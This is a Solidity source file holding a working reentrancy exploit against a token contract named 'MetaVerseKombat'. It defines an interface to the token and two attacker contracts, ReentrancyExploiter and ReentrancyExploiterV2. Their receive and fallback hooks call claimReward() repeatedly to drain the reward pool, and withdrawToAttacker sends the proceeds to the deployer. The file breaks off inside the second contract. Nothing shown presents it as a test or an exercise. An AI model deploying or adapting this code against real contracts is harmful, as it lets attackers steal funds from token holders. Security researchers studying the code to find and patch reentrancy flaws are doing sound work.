interface MetaVerseKombat {
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function pancakePair() external view returns (address);
    function setSwapAndLiquifyEnabled(bool _enabled, uint256 _minTokensBeforeSwap) external;
    function updateSellFee(uint sellTaxFee, uint LiquiditySellPer, uint marketingSellPer, uint RewardSellPer, uint autoBurnSellPer) external;
    function updateBuyFee(uint buyTaxFee, uint LiquidityBuyPer, uint marketingBuyPer, uint RewardBuyPer, uint autoBurnBuyPer) external;
    function update_AntiWhaleLimits(uint256 maxAntiWhaleLimits, uint256 minAntiWhaleLimits) external;
    function set_sellTimeInterval(uint256 sellTimeInterval) external;
    function unblockWalletAddress(address WalletAddress) external;
    function _rewardPool() external view returns (uint256);
    function claimReward() external;
    function UserrewardPoolOnLastClaim(address) external view returns (uint256);
    function update_MarketingWalletAddress(address) external;
}

contract ReentrancyExploiter {
    MetaVerseKombat public token;
    uint256 public reentrancyCount;
    address public attacker;

    constructor(address _token) {
        token = MetaVerseKombat(_token);
        attacker = msg.sender;
    }

    function attack() external {
        reentrancyCount = 0;
        token.claimReward();
    }

    receive() external payable {
        reentrancyCount++;

        if (reentrancyCount < 3 && address(token).balance > 0) {
            uint256 myLastClaim = token.UserrewardPoolOnLastClaim(address(this));
            uint256 currentPool = token._rewardPool();

            if (currentPool > myLastClaim) {
                token.claimReward();
            }
        }
    }

    function withdrawToAttacker() external {
        payable(attacker).transfer(address(this).balance);
    }

    fallback() external payable {
        // Call receive function
        (bool success, ) = address(this).call("");
        require(success, "Fallback call failed");
    }
}

contract ReentrancyExploiterV2 {
    MetaVerseKombat public token;
    address public attacker;
    uint256 public reentrancyCount;

    constructor(address _token) {
        token = MetaVerseKombat(_token);
        attacker = msg.sender;
    }

    // This will be called when contract sends ETH to marketing wallet
    receive() external payable {
        reentrancyCount++;

        // Try to re-enter
        if (reentrancyCount < 2) {
            // Try to claim reward if possible
            token.claimReward();
        }

        // Send to attacker
        payable(attacker).transfer(address(this).balance);
    }

    function withdrawToAttacker() external {
        payable(attacker).transfer(address(this).balance);
    }

